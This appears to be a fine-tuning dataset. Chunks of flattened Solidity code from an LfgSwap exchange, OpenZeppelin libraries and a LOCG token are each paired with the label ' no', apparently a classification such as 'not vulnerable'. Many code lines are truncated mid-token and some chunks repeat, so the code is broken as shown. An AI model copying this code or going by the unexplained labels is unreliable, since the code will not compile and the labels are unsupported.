EnumerableSet.at(_minters, _index); \n} \n \n// modifier for mint function \nmodifier onlyMinter() { \n require(isMinter(msg.sender), \"caller is not the minter\"); \n _; \n}\n}\nLfgSwapFactory.sol \n```javascript \n// Sources flattened with hardhat v2.10.2 https://hardhat.org \n \n// File contracts/interface/ILfgSwapFactory.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface ILfgSwapFactory { \n event PairCreated(address indexed token0, address indexed token1, address pair, uint); \n \n function feeTo() external view returns (address); \n function feeToSetter() external view returns (address); \n \n function getPair(address tokenA, address tokenB) external view returns (address pair); \n function allPairs(uint) external view returns (address pair); \n function allPairsLength() external view returns (uint); \n \n function sortTokens(address tokenA, address tokenB) external pure returns (address token0, addres\n \n function pairFor(address tokenA, address tokenB) external view returns (address pair); \n \n function createPair(address tokenA, address tokenB) external returns (address pair); \n \n function setFeeTo(address) external; \n function setFeeToSetter(address) external; \n \n} \n \n \n// File contracts/libraries/SafaMath.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \n// File contracts/libraries/UQ112x112.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity =0.6.12; \n \n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format)\n \n// range: [0, 2**112 - 1] \n// resolution: 1 / 2**112 \n \nlibrary UQ112x112 { \n uint224 constant Q112 = 2**112; \n \n // encode a uint112 as a UQ112x112 \n function encode(uint112 y) internal pure returns (uint224 z) { \n z = uint224(y) * Q112; // never overflows \n } \n \n // divide a UQ112x112 by a uint112, returning a UQ112x112 \n function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) { \n z = x / uint224(y); \n } \n} \n \n \n// File contracts/core/LfgSwapPair.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity =0.6.12; \n \n \ncontract LfgSwapFactory is ILfgSwapFactory { \n address public override feeTo; \n address public override feeToSetter; \n bytes32 public initCodeHash; \n \n mapping(address => mapping(address => address)) public override getPair; \n address[] public override allPairs; \n \n event PairCreated(address indexed token0, address indexed token1, address pair, uint); \n \n constructor(address _feeToSetter) public { \n feeToSetter = _feeToSetter; \n initCodeHash = keccak256(abi.encodePacked(type(LfgSwapPair).creationCode)); \n } \n \n function allPairsLength() external override view returns (uint) { \n return allPairs.length; \n } \n \nLfgSwapRouter.sol\n function pairCodeHash() external pure returns (bytes32) { \n return keccak256(type(LfgSwapPair).creationCode); \n } \n \n // returns sorted token addresses, used to handle return values from pairs sorted in this order \n function sortTokens(address tokenA, address tokenB) public override pure returns (address token0, \n require(tokenA != tokenB, 'LfgSwapFactory: IDENTICAL_ADDRESSES'); \n (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); \n require(token0 != address(0), 'LfgSwapFactory: ZERO_ADDRESS'); \n } \n \n // calculates the CREATE2 address for a pair without making any external calls \n function pairFor(address tokenA, address tokenB) public override view returns (address pair) { \n (address token0, address token1) = sortTokens(tokenA, tokenB); \n pair = address(uint(keccak256(abi.encodePacked( \n hex'ff', \n address(this), \n keccak256(abi.encodePacked(token0, token1)), \n initCodeHash \n )))); \n } \n \n function createPair(address tokenA, address tokenB) external override returns (address pair) { \n require(tokenA != tokenB, 'LfgSwap: IDENTICAL_ADDRESSES'); \n (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); \n require(token0 != address(0), 'LfgSwap: ZERO_ADDRESS'); \n require(getPair[token0][token1] == address(0), 'LfgSwap: PAIR_EXISTS'); // single check is su\n bytes memory bytecode = type(LfgSwapPair).creationCode; \n bytes32 salt = keccak256(abi.encodePacked(token0, token1)); \n assembly { \n pair := create2(0, add(bytecode, 32), mload(bytecode), salt) \n } \n LfgSwapPair(pair).initialize(token0, token1); \n getPair[token0][token1] = pair; \n getPair[token1][token0] = pair; // populate mapping in the reverse direction \n allPairs.push(pair); \n emit PairCreated(token0, token1, pair, allPairs.length); \n } \n \n function getSalt() public view returns(bytes32) { \n bytes memory bytecode = type(LfgSwapPair).creationCode; \n return keccak256(abi.encodePacked(bytecode)); \n } \n \n function setFeeTo(address _feeTo) external override { \n require(msg.sender == feeToSetter, 'LfgSwap: FORBIDDEN'); \n feeTo = _feeTo; \n } \n \n \n function setFeeToSetter(address _feeToSetter) external override { \n require(msg.sender == feeToSetter, 'LfgSwap: FORBIDDEN'); \n feeToSetter = _feeToSetter; \n } \n \n} \n \n \n \n// Sources flattened with hardhat v2.10.2 https://hardhat.org \n \n// File @openzeppelin/contracts/utils/Context.sol@v3.4.2 \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with GSN meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes memory) { \n this; // silence state mutability warning without generating bytecode - see https://github.co\n return msg.data; \n } \n} \n \n \n// File @openzeppelin/contracts/access/Ownable.sol@v3.4.2 \n \n// -- SPDX-License-Identifier:: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \nabstract contract Ownable is Context { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n constructor () internal { \n address msgSender = _msgSender(); \n _owner = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view virtual returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n emit OwnershipTransferred(_owner, address(0)); \n _owner = address(0); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), \"Ownable: new owner is the zero address\"); \n emit OwnershipTransferred(_owner, newOwner); \n _owner = newOwner; \n } \n} \n \n \n// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v3.4.2 \n \n// -- SPDX-License-Identifier:: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \n// File @openzeppelin/contracts/math/SafeMath.sol@v3.4.2 \n \n// -- SPDX-License-Identifier:: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \n \n/** \n * @title SafeERC20 \n * @dev Wrappers around ERC20 operations that throw on failure (when the token \n * contract returns false). Tokens that return no value (and instead revert or \n * throw on failure) are also supported, non-reverting calls are assumed to be \n * successful. \n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract, \n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc. \n */ \nlibrary SafeERC20 { \n using SafeMath for uint256; \n using Address for address; \n \n function safeTransfer(IERC20 token, address to, uint256 value) internal { \n _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value)); \n } \n \n function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal { \n _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, valu\n } \n \n /** \n * @dev Deprecated. This function has issues similar to the ones found in \n * {IERC20-approve}, and its usage is discouraged. \n * \n * Whenever possible, use {safeIncreaseAllowance} and \n * {safeDecreaseAllowance} instead. \n */ \n function safeApprove(IERC20 token, address spender, uint256 value) internal { \n // safeApprove should only be called when setting an initial allowance, \n // or when resetting it to zero. To increase and decrease it, use \n // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' \n // solhint-disable-next-line max-line-length \n require((value == 0) || (token.allowance(address(this), spender) == 0), \n \"SafeERC20: approve from non-zero to non-zero allowance\" \n ); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); \n } \n \n function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal { \n uint256 newAllowance = token.allowance(address(this), spender).add(value); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal { \n uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreas\n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n /** \n * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxin\n * on the return value: the return value is optional (but if data is returned, it must not be fal\n * @param token The token targeted by the call. \n * @param data The call data (encoded using abi.encode or one of its variants). \n */ \n function _callOptionalReturn(IERC20 token, bytes memory data) private { \n // We need to perform a low level call here, to bypass Solidity's return data size checking m\n // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which \n // the target address contains contract code and also asserts for success in the low-level ca\n \n bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\n if (returndata.length > 0) { // Return data is optional \n // solhint-disable-next-line max-line-length \n require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\"); \n } \n } \n} \n \n \n// File contracts/interface/ILfgSwapPair.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface ILfgSwapPair { \n event Approval(address indexed owner, address indexed spender, uint value); \n event Transfer(address indexed from, address indexed to, uint value); \n \n function name() external pure returns (string memory); \n function symbol() external pure returns (string memory); \n function decimals() external pure returns (uint8); \n function totalSupply() external view returns (uint); \n function balanceOf(address owner) external view returns (uint); \n function allowance(address owner, address spender) external view returns (uint); \n \n function approve(address spender, uint value) external returns (bool); \n function transfer(address to, uint value) external returns (bool); \n function transferFrom(address from, address to, uint value) external returns (bool); \n \n function DOMAIN_SEPARATOR() external view returns (bytes32); \n function PERMIT_TYPEHASH() external pure returns (bytes32); \n function nonces(address owner) external view returns (uint); \n \n function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, by\n \n event Mint(address indexed sender, uint amount0, uint amount1); \n event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); \n event Swap( \n address indexed sender, \n uint amount0In, \n uint amount1In, \n uint amount0Out, \n uint amount1Out, \n address indexed to \n ); \n event Sync(uint112 reserve0, uint112 reserve1); \n \n function MINIMUM_LIQUIDITY() external pure returns (uint); \n function factory() external view returns (address); \n function token0() external view returns (address); \n function token1() external view returns (address); \n function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTim\n function price0CumulativeLast() external view returns (uint); \n function price1CumulativeLast() external view returns (uint); \n function kLast() external view returns (uint); \n \n function mint(address to) external returns (uint liquidity); \n function burn(address to) external returns (uint amount0, uint amount1); \n function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; \n function skim(address to) external; \n function sync() external; \n \n function initialize(address, address) external; \n} \n \n \n// File contracts/interface/ILfgSwapFactory.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface ILfgSwapFactory { \n event PairCreated(address indexed token0, address indexed token1, address pair, uint); \n \n function feeTo() external view returns (address); \n function feeToSetter() external view returns (address); \n \n function getPair(address tokenA, address tokenB) external view returns (address pair); \n function allPairs(uint) external view returns (address pair); \n function allPairsLength() external view returns (uint); \n \n function sortTokens(address tokenA, address tokenB) external pure returns (address token0, addres\n \n function pairFor(address tokenA, address tokenB) external view returns (address pair); \n \n function createPair(address tokenA, address tokenB) external returns (address pair); \n \n function setFeeTo(address) external; \n function setFeeToSetter(address) external; \n \n} \n \n \n// File contracts/libraries/LfgSwapLibrary.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \n \nlibrary LfgSwapLibrary { \n using SafeMath for uint; \n \n // returns sorted token addresses, used to handle return values from pairs sorted in this order \n function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, addres\n require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES'); \n (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); \n require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS'); \n } \n \n // calculates the CREATE2 address for a pair without making any external calls \n function pairFor(address factory, address tokenA, address tokenB) internal view returns (address \n (address token0, address token1) = sortTokens(tokenA, tokenB); \n pair = ILfgSwapFactory(factory).getPair(token0, token1); \n \n // = address(uint(keccak256(abi.encodePacked( \n // hex'ff', \n // factory, \n // keccak256(abi.encodePacked(token0, token1)), \n // hex'e18a34eb0e04b04f7a0ac29a6e80748dca96319b42c54d679cb821dca90c6303' // init code \n // )))); \n } \n \n // fetches and sorts the reserves for a pair \n function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint \n (address token0,) = sortTokens(tokenA, tokenB); \n (uint reserve0, uint reserve1,) = ILfgSwapPair(pairFor(factory, tokenA, tokenB)).getReserves(\n (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0); \n } \n \n // given some amount of an asset and pair reserves, returns an equivalent amount of the other ass\n function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) { \n require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT'); \n require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY'); \n amountB = amountA.mul(reserveB) / reserveA; \n } \n \n // given an input amount of an asset and pair reserves, returns the maximum output amount of the \n function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint \n require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT'); \n require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY'); \n uint amountInWithFee = amountIn.mul(997); \n uint numerator = amountInWithFee.mul(reserveOut); \n uint denominator = reserveIn.mul(1000).add(amountInWithFee); \n amountOut = numerator / denominator; \n } \n \n // given an output amount of an asset and pair reserves, returns a required input amount of the o\n function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint \n require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT'); \n require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY'); \n uint numerator = reserveIn.mul(amountOut).mul(1000); \n uint denominator = reserveOut.sub(amountOut).mul(997); \n amountIn = (numerator / denominator).add(1); \n } \n \n // performs chained getAmountOut calculations on any number of pairs \n function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view retur\n require(path.length >= 2, 'UniswapV2Library: INVALID_PATH'); \n amounts = new uint[](path.length); \n amounts[0] = amountIn; \n for (uint i; i < path.length - 1; i++) { \n (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]); \n amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut); \n } \n } \n \n // performs chained getAmountIn calculations on any number of pairs \n function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view retur\n require(path.length >= 2, 'UniswapV2Library: INVALID_PATH'); \n amounts = new uint[](path.length); \n amounts[amounts.length - 1] = amountOut; \n for (uint i = path.length - 1; i > 0; i--) { \n (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]); \n amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut); \n } \n } \n} \n \n \n// File contracts/libraries/TransferHelper.sol \n \n// -- SPDX-License-Identifier:: GPL-3.0-or-later \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0; \n \n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return t\nlibrary TransferHelper { \n function safeApprove(address token, address to, uint value) internal { \n // bytes4(keccak256(bytes('approve(address,uint256)'))); \n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value))\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_F\n } \n \n function safeTransfer(address token, address to, uint value) internal { \n // bytes4(keccak256(bytes('transfer(address,uint256)'))); \n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value))\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_\n } \n \n function safeTransferFrom(address token, address from, address to, uint value) internal { \n // bytes4(keccak256(bytes('transferFrom(address,address,uint256)'))); \n (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, v\n require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_\n } \n \n function safeTransferETH(address to, uint value) internal { \n (bool success,) = to.call{value:value}(new bytes(0)); \n require(success, 'TransferHelper: ETH_TRANSFER_FAILED'); \n } \n} \n \n \n// File contracts/interface/ILfgSwapRouter.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.2; \n \ninterface ILfgSwapRouter { \n \n function factory() external pure returns (address); \n function WETH() external pure returns (address); \n \n function addLiquidity( \n address tokenA, \n address tokenB, \n uint amountADesired, \n uint amountBDesired, \n uint amountAMin, \n uint amountBMin, \n address to, \n uint deadline \n ) external returns (uint amountA, uint amountB, uint liquidity); \n function addLiquidityETH( \n address token, \n uint amountTokenDesired, \n uint amountTokenMin, \n uint amountETHMin, \n address to, \n uint deadline \n ) external payable returns (uint amountToken, uint amountETH, uint liquidity); \n function removeLiquidity( \n address tokenA, \n address tokenB, \n uint liquidity, \n uint amountAMin, \n uint amountBMin, \n address to, \n uint deadline \n ) external returns (uint amountA, uint amountB); \n function removeLiquidityETH( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountETHMin, \n address to, \n uint deadline \n ) external returns (uint amountToken, uint amountETH); \n function removeLiquidityWithPermit( \n address tokenA, \n address tokenB, \n uint liquidity, \n uint amountAMin, \n uint amountBMin, \n address to, \n uint deadline, \n bool approveMax, uint8 v, bytes32 r, bytes32 s \n ) external returns (uint amountA, uint amountB); \n function removeLiquidityETHWithPermit( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountETHMin, \n address to, \n uint deadline, \n bool approveMax, uint8 v, bytes32 r, bytes32 s \n ) external returns (uint amountToken, uint amountETH); \n function swapExactTokensForTokens( \n uint amountIn, \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external returns (uint[] memory amounts); \n function swapTokensForExactTokens( \n uint amountOut, \n uint amountInMax, \n address[] calldata path, \n address to, \n uint deadline \n ) external returns (uint[] memory amounts); \n function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadl\n external \n payable \n returns (uint[] memory amounts); \n function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address \n external \n returns (uint[] memory amounts); \n function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address \n external \n returns (uint[] memory amounts); \n function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline\n external \n payable \n returns (uint[] memory amounts); \n \n function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB); \n function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint \n function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint \n function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memo\n function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memo\n \n function removeLiquidityETHSupportingFeeOnTransferTokens( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountETHMin, \n address to, \n uint deadline \n ) external returns (uint amountETH); \n function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( \n address token, \n uint liquidity, \n uint amountTokenMin, \n uint amountETHMin, \n address to, \n uint deadline, \n bool approveMax, uint8 v, bytes32 r, bytes32 s \n ) external returns (uint amountETH); \n \n function swapExactTokensForTokensSupportingFeeOnTransferTokens( \n uint amountIn, \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external; \n function swapExactETHForTokensSupportingFeeOnTransferTokens( \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external payable; \n function swapExactTokensForETHSupportingFeeOnTransferTokens( \n uint amountIn, \n uint amountOutMin, \n address[] calldata path, \n address to, \n uint deadline \n ) external; \n} \n \n \n// File contracts/interface/IWETH.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface IWETH { \n function deposit() external payable; \n function transfer(address to, uint value) external returns (bool); \n function withdraw(uint) external; \n function balanceOf(address) external returns (uint256); \n} \n \n \n// File contracts/interface/IERC20LfgSwap.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface IERC20LfgSwap { \n event Approval(address indexed owner, address indexed spender, uint value); \n event Transfer(address indexed from, address indexed to, uint value); \n \n function name() external pure returns (string memory); \n function symbol() external pure returns (string memory); \n function decimals() external pure returns (uint8); \n function totalSupply() external view returns (uint); \n function balanceOf(address owner) external view returns (uint); \n function allowance(address owner, address spender) external view returns (uint); \n \n function approve(address spender, uint value) external returns (bool); \n function transfer(address to, uint value) external returns (bool); \n function transferFrom(address from, address to, uint value) external returns (bool); \n \n function DOMAIN_SEPARATOR() external view returns (bytes32); \n function PERMIT_TYPEHASH() external pure returns (bytes32); \n function nonces(address owner) external view returns (uint); \n \n function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, by\n} \n \n \n// File contracts/core/LfgSwapRouter.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity =0.6.12; \n \n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format)\n \n// range: [0, 2**112 - 1] \n// resolution: 1 / 2**112 \n \nlibrary UQ112x112 { \n uint224 constant Q112 = 2**112; \n \n // encode a uint112 as a UQ112x112 \n function encode(uint112 y) internal pure returns (uint224 z) { \n z = uint224(y) * Q112; // never overflows \n } \n \n // divide a UQ112x112 by a uint112, returning a UQ112x112 \n function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) { \n z = x / uint224(y); \n } \n} \n \n \n// File contracts/interface/ILfgSwapFactory.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.5.0; \n \ninterface ILfgSwapFactory { \n event PairCreated(address indexed token0, address indexed token1, address pair, uint); \n \n function feeTo() external view returns (address); \n function feeToSetter() external view returns (address); \n \n function getPair(address tokenA, address tokenB) external view returns (address pair); \n function allPairs(uint) external view returns (address pair); \n function allPairsLength() external view returns (uint); \n \n function sortTokens(address tokenA, address tokenB) external pure returns (address token0, addres\n \n function pairFor(address tokenA, address tokenB) external view returns (address pair); \n \n function createPair(address tokenA, address tokenB) external returns (address pair); \n \n function setFeeTo(address) external; \n function setFeeToSetter(address) external; \n \n} \n \n \n// File contracts/core/LfgSwapPair.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"@openzeppelin/contracts/access/AccessControl.sol\"; \nimport \"@openzeppelin/contracts/security/Pausable.sol\"; \nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; \nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; \nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; \nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\"; \nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\"; \nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; \nimport \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\"; \n \ncontract LOCG is AccessControl, ERC20, Pausable, ERC20Burnable, ERC20Snapshot { \n using SafeERC20 for IERC20; \n \n string public constant NAME = \"LOCGame Token\"; \n string public constant SYMBOL = \"LOCG\"; \n uint256 public constant MAX_TOTAL_SUPPLY = 150_000_000 * 1e18; \n \n bytes32 public constant WHITELISTED_ROLE = keccak256(\"WHITELISTED_ROLE\"); // Whitelisted ad\n \n modifier onlyAdmin() { \n require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), \"!admin\"); \n _; \n } \n \n constructor (address daoMultiSig) ERC20(NAME, SYMBOL) { \n _setupRole(DEFAULT_ADMIN_ROLE, daoMultiSig); // DEFAULT_ADMIN_ROLE can grant other roles \n _setupRole(WHITELISTED_ROLE, daoMultiSig); \n _mint(daoMultiSig, MAX_TOTAL_SUPPLY); \n } \n \n \n /** \n * @notice Triggers stopped state. \n * Requirements: \n * - The contract must not be paused. \n */ \n function pause() external onlyAdmin { \n _pause(); \n } \n \n /** \n * @notice Returns to normal state. \n * Requirements: \n * - The contract must be paused. \n */ \n function unpause() external onlyAdmin { \n _unpause(); \n } \n \n /** \n * @notice Creates a new snapshot and returns its snapshot id. \n */ \n function snapshot() external onlyAdmin { \n _snapshot(); \n } \n \n\n\n###\n\n", "completion": " no###\n###"}
